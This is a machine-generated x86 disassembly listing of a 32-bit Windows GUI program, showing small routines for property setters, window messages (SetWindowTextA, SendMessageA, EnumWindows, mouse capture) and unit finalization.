pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b9b4
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ba0c
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_42b8a0
sub_42ba20
push esi
mov esi eax
mov eax esi
call sub_436294
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403324
sub_42bb6d
jmp sub_40387c
sub_42bb74
pop edi
pop esi
pop ecx
pop ebp
retn
sub_42bb7c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42bb84
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42bb8c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_42a2bc
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_42a3d0
pop esi
pop ebx
retn
sub_42bdbc
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403128
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42be80
jmp sub_40387c
sub_42be87
pop ebp
retn
sub_42be8c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42bdd8
call sub_403c4c
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b3c
sub_42bed9
jmp sub_40387c
sub_42bee0
pop ebp
retn
sub_42bee4
sub [ rw-data ] 0x1
retn
sub_42bf40
jmp sub_40387c
sub_42bf47
pop ebp
retn
sub_42bf4c
sub [ rw-data ] 0x1
retn
sub_42bfa8
jmp sub_40387c
sub_42bfaf
pop ebp
retn
sub_42bfb4
sub [ rw-data ] 0x1
retn
sub_42c015
jmp sub_40387c
sub_42c01c
pop ebp
retn
sub_42c020
sub [ rw-data ] 0x1
retn
sub_42c06c
jmp sub_40387c
sub_42c073
pop ebp
retn
sub_42c078
sub [ rw-data ] 0x1
retn
sub_42c0a5
jmp sub_40387c
sub_42c0ac
pop ebp
retn
sub_42c0b0
sub [ rw-data ] 0x1
retn
sub_42c158
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bb54
mov [ rw-data ] eax
sub_42c18d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42c1a4
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42c227
jmp sub_40387c
sub_42c22e
pop ebp
retn
sub_42c230
sub [ rw-data ] 0x1
retn
sub_42c29f
jmp [ edi ]
sub_42c540
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42c558
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42c59c
push ebx
mov ebx eax
mov eax ebx
call sub_42cd94
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42cd83
jmp sub_40387c
sub_42cd94
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_426a38
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42c56c
sub_42cdeb
jmp sub_40387c
sub_42cdf2
pop ebp
retn
sub_42cdf4
sub [ rw-data ] 0x1
retn
sub_42da22
jmp sub_40387c
sub_42da29
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42db38
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_436c64
mov eax ebx
mov si 0xffc7
call sub_403324
pop esi
pop ebx
retn
sub_42dc24
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dc40
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403324
sub_42dc5c
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_42dc68
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419340
sub_42dc7c
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dcdc
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dd50
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403324
pop esi
pop ebx
retn
sub_42dd6c
push esi
mov esi eax
mov eax esi
call sub_436770
mov eax esi
mov si 0xffc7
call sub_403324
pop esi
retn
sub_42de11
jmp sub_40387c
sub_42de18
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42de20
push ebx
mov ebx eax
mov eax ebx
call sub_4368d4
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_42de44
push ebx
mov ebx eax
mov eax ebx
call sub_4368ec
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_42df30
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_42e494
sub_42df44
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_42e494
mov eax ebx
call sub_438930
sub_42e11c
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_43b390
push eax
call SetWindowTextA
pop ebx
retn
sub_42e138
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop ebx
retn
sub_42e154
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop ebx
retn
sub_42e1fa
jmp sub_40387c
sub_42e201
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e29a
jmp sub_40387c
sub_42e413
jmp sub_40387c
sub_42e478
push ebx
mov ebx eax
mov eax ebx
call sub_42df98
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_43872c
pop ebx
retn
sub_42e578
push ebx
mov ebx eax
mov eax ebx
call sub_4347c0
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42e670
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403324
sub_42e745
jmp sub_40387c
sub_42e74c
pop ebp
retn
sub_42e750
sub [ rw-data ] 0x1
retn
sub_42e8ad
jmp sub_40387c
sub_42e8b4
pop ebp
retn
sub_42e8b8
sub [ rw-data ] 0x1
retn
sub_42e8c0
mov [ fs : esi ] 0xf6
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_42f138
sub_42e8d1
add eax 0xffffffe0
jmp sub_42eeb8
sub_42e8d9
add eax 0xffffffe0
jmp sub_42ef20
sub_42e8e1
add eax 0xffffffe0
jmp sub_42f034
sub_42e8e9
add eax 0xffffffe0
jmp sub_42f0a8
sub_42e8f1
add eax 0xffffffe0
jmp sub_42eb64
sub_42e8f9
add eax 0xffffffe0
jmp sub_42eb78
sub_42e901
add eax 0xffffffe0
jmp sub_42ebf0
sub_42e909
add eax 0xffffffe0
jmp sub_42ec94
sub_42e911
add eax 0xffffffe0
jmp sub_42ec98
sub_42e919
add eax 0xffffffe0
jmp sub_42ed20
sub_42e921
add eax 0xffffffe0
jmp sub_42ee68
sub_42e929
add eax 0xffffffe0
jmp sub_42ee6c
sub_42e931
add eax 0xffffffe0
jmp sub_42ee88
sub_42e943
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405588
sub_42e94d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40559c
sub_42e9fe
add [ eax ] al
inc eax
0x42 0x0
sub_42ea08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop edx
0x240042 0x0
sub_42eb21
jmp sub_40387c
sub_42eb28
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42eb64
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403ecc
pop ebx
retn
sub_42ebdf
jmp sub_40387c
sub_42ebe6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ec78
jmp sub_40387c
sub_42ec7f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ec94
mov al 0x1
retn
sub_42ed13
jmp sub_40387c
sub_42ed1a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ee18
jmp sub_40387c
sub_42ee1f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ee68
mov [ eax + 0xc ] edx
retn
sub_42ee6c
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_42ef10
jmp sub_40387c
sub_42ef17
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f016
jmp sub_40387c
sub_42f01d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f096
jmp sub_40387c
sub_42f09d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f128
jmp sub_40387c
sub_42f12f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f223
jmp sub_40387c
sub_42f22a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f2ec
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_42f238
call EnumWindows
retn
sub_42f37e
jmp sub_40387c
sub_42f385
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42f390
xor eax eax
retn
sub_42f489
jmp sub_40387c
sub_42f490
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f57a
jmp sub_40387c
sub_42f581
pop ebp
retn
sub_42f5d6
jmp sub_40387c
sub_42f5dd
pop ebp
retn
sub_42fd58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_430744
jmp r-xdata
sub_430746
0xe8ffe9ff 0xe7ff
sub_43074d
jmp esi
sub_4316b7
pushad
add [ eax ] al
jmp [ eax ]
sub_431775
add eax 0xffffff8c
jmp sub_43d9d8
sub_43177d
add eax 0xffffff8c
jmp sub_43d9dc
sub_431785
add eax 0xffffff8c
jmp sub_43dac8
sub_43179a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_4317a7
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_4317b4
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_4317c1
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_4317ce
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_4317db
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_4317e8
add eax 0xffffff8c
jmp sub_43f138
sub_4317fa
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405588
sub_431804
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40559c
sub_431940
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_431c53
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413368
retn
sub_431c70
push 0x15
mov ecx rw-data
call sub_413328
retn
sub_431d5c
call GetCapture
call sub_431a40
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_431fc0
push ebx
push eax
push sub_432144
call sub_41a3bc
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_431fd8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_432008
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41a470
pop ebx
retn
sub_4320e6
jmp sub_4035c8
sub_432118
xor eax eax
retn
sub_43211c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_432134
retn
sub_432138
mov eax [ rw-data ]
retn
sub_432140
retn
sub_43216e
jmp sub_4035c8
sub_432173
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_455598
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432190
call sub_403380
xor eax eax
mov [ rw-data ] eax
retn
sub_4321a0
call sub_40337c
xor eax eax
mov [ rw-data ] eax
retn
sub_4321b0
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40344c
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_432260
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_432278
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_4322c4
retn
sub_43247c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403324
pop esi
retn
sub_432490
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403324
pop esi
retn
sub_4324a4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4324b0
mov eax 0x4
retn
sub_4324b8
retn
sub_4330a9
jmp sub_4035c8
sub_433396
jmp sub_40387c
sub_433408
jmp sub_40387c
sub_433414
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43313c
sub_433593
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d374
retn
sub_4335a9
jmp sub_40387c
sub_4335d0
jmp sub_40387c
sub_433652
jmp sub_40387c
sub_43367a
jmp sub_40387c
sub_433681
mov esp ebp
pop ebp
retn
sub_433739
jmp sub_40387c
sub_433790
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43375c
mov [ ebx + 0x58 ] esi
sub_4338e4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4338f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4339e1
jmp sub_40387c
sub_4339e8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433a6b
jmp sub_40387c
sub_433a72
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_433e40
xor eax eax
retn
sub_433e44
mov al [ eax + 0x58 ]
retn
sub_433e48
xor eax eax
retn
sub_433e4c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_433e54
mov eax [ eax + 0x30 ]
retn
sub_433ef8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_433fa4
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_433fbc
mov [ eax + 0x5d ] dl
retn
sub_433fc0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_437b94
sub_433fd0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_4344b3
jmp sub_40387c
sub_4344ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43451c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_4345a0
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_4346bd
jmp sub_40387c
sub_4346c4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4347c0
push eax
xor ecx ecx
mov edx 0xb037
call sub_435d5c
retn
sub_434981
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403324
sub_434a32
jmp sub_40387c
sub_434a39
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434b10
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_435d5c
sub_434b28
push 0x0
xor ecx ecx
mov edx 0xe
call sub_435d5c
retn
sub_434b38
push edx
mov edx 0xd
call sub_435d5c
retn
sub_434b44
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_434b58
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_434c39
jmp sub_40387c
sub_434c40
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434c48
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_435d5c
sub_434cb8
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_434ccc
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_434cd8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_434ce0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_435d5c
sub_434d04
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_435d5c
sub_434d28
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_435d5c
sub_434d70
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_434d78
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_435d5c
sub_434d9c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_435d5c
sub_434dc0
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_435d5c
sub_434ddc
push ebx
mov ebx eax
call sub_431d5c
cmp ebx eax
sete al
pop ebx
retn
sub_434e14
push esi
mov dl 0x1
mov si 0xffce
call sub_403324
pop esi
retn
sub_434f5e
jmp sub_40387c
sub_434f65
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435088
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_434ffc
retn
sub_4350dc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_4351c9
jmp sub_40387c
sub_4351e8
xor eax eax
retn
sub_4351ec
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_435204
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43521c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_435238
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_435250
retn
sub_435314
retn
sub_435318
cmp eax [ rw-data ]
sete al
retn
sub_43538c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4354a8
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403324
pop esi
pop ebp
retn 0x4
sub_4354e8
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43577f
jmp sub_40387c
sub_435786
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435790
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403324
pop esi
retn
sub_4357a4
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403324
pop esi
retn
sub_435a73
jmp sub_40387c
sub_435b1c
push esi
mov si 0xffee
call sub_403324
pop esi
retn
sub_435b28
mov al 0x1
retn
sub_435e00
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_434208
retn
sub_435e24
retn
sub_43603d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416b8c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_436058
mov al [ eax + 0x5e ]
xchg edx eax
call sub_418ec4
retn
sub_436150
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_436768
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436770
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436778
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436830
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436850
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_434d04
mov [ ebx + 0x9a ] 0x1
sub_4368a8
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_434ca8
mov [ ebx + 0x56 ] 0x1
sub_4368cc
mov [ edx + 0xc ] 0x1
retn
sub_4368d4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_435d5c
sub_4368ec
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_435d5c
sub_436904
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_436b6a
jmp sub_40387c
sub_436b71
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436b9c
mov eax [ r-xdata ]
retn
sub_436d38
jmp sub_40387c
sub_436d3f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436e60
mov eax [ eax + 0xb8 ]
retn
sub_436ec8
push ebx
mov ebx eax
mov eax ebx
call sub_4351ec
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_436ee4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43707c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4370ac
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_4370b4
call sub_433c74
retn
sub_4371b4
jmp sub_40387c
sub_437374
jmp sub_40387c
sub_4373c4
jmp sub_40387c
sub_4373fc
retn
sub_437685
jmp sub_40387c
sub_43780d
jmp sub_40387c
sub_437b6f
jmp sub_40387c
sub_437c1b
jmp sub_40387c
sub_437c28
inc [ eax + 0x160 ]
retn
sub_437c30
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_437c50
sub_437c50
xor edx edx
call sub_437b94
retn
sub_437d1d
jmp sub_40387c
sub_437d24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437e13
jmp sub_40387c
sub_43833a
jmp sub_40387c
sub_438341
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438509
jmp sub_40387c
sub_438510
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4385e4
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4387d1
jmp sub_40387c
sub_4387d8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4388c8
xor eax eax
retn
sub_438930
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_435d5c
sub_438a5e
jmp sub_4035c8
sub_438b93
jmp sub_40387c
sub_438b9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438ba4
jmp sub_4035c8
sub_438ba9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_455598
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439164
jmp sub_40387c
sub_43916b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439174
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_439672
jmp sub_40387c
sub_4396c4
push ebx
mov ebx eax
call sub_41bbb0
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_435d5c
pop ebx
retn
sub_4396e0
mov ecx [ edx + 0x8 ]
push ecx
